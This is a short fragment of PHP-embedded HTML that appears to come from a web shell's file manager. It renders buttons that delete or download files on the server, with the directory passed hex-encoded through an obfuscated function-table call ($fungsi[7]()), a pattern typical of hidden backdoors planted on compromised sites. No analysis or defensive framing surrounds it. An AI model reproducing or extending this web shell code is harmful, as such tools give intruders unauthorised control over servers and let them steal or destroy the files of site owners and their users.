 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$path/$file'><i class='bi bi-download'></i></a>
